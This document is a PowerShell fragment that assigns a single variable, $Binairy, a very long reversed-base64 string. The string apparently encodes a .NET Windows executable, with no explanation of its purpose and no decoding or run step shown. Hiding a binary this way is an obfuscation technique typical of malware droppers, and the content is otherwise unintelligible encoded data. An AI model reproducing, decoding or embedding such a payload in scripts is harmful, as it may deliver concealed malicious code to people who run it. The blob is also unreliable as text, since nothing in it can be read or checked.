    $Binairy = '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0F2YpxGcwFEAn5WayR3UvRFAoRXYQ9FdldGAk5WaGBwcldmbhh2Q0lWbt92QAU2avZnbJBAZkFEA0hXZU9FdldGAs9mc052bDBgblJHZslGaD9FdldGAzVWayRnbFlncvR3YlJXaEBQeyRnbFlncvR3YlJXaEBwclNWa2JXZTlncvR3YlJXaE5SblR3c5NFA0F2Yu92QAcmbpJHdTBQZtFmTl5WaoNWYN9FdldGA05WZt52bylmduVEAlRXdilmc0RXQ5RXaslmYpRXYw12bDVWbpRnb1JFAlRXdilmc0RXQz52bpRXY4FGblJlbvlGdhxWaw12bDBwclNWa2JXZTJXZslGct92QuUWbpRnb1JlLtVGdzl3UAMXZk9WTn5WandWdiVGRAUGd1JWayRHdBVGbiF2ZnVnYlREAzNWa0N3budWYpRkLtVGdzl3UAUGd1JWayRHdB52bpNnclZVZslmR5xmYtV2czFEAlRXdilmc0RXQu9WazJXZWlHbi1WZzNXQAUGd1JWayRHdBRWa1dEAlRXdilmc0RXQlxmYpNXaW12bDBwclNWa2JXZTB3byVGdulkLl1Wa05WdS5SblR3c5NFAlRXdilmc0RXQlJXd0xWdDlHbi1WZzNXQAUGd1JWayRHdBtmch1WZkFmcUlHbi1WZzNXQAUGd1JWayRHdBRHanlmc5B3bDlHbi1WZzNXQAUGd1JWayRHdBR3Y1R2byBVesJWblN3cBBQZ0VnYpJHd0FUeuFGct92Q5xmYtV2czFEAlRXdilmc0RXQu9Wa0Fmc1dWam52bDlHbi1WZzNXQAUGd1JWayRHdB52bpRHcpJ3YzVGR5xmYtV2czFEAlRXdilmc0RXQlxGdpRVesJWblN3cBBgbvlGdjVGbmVmUu0WZ0NXeTBQZ1xWY2BwZul2cvB3cpRGAlBgclRmblNHAlJXd0xWdDBQZyVHdsV3QfRXZzBQZyVHdsV3QfRXZnBgcldWYuFWTlNmc192clJ1X0V2ZAUmc1RHb1NUZjJXdvNXZyBwbm5WSlJXd0xWdDBgbvlGdhpXasFmYvx2Ru0WZ0NXeTBgbh1UZjJXdvNXZyBgcldWYuFWTlNmc192clJFAzV2YyV3bzVmUu0WZ0NXeTBgbpFWTAQHb1FmZlREA0xWdhZWZE9FdldGAlNmbhR3culEdsVXYmVGZAEjbvRHd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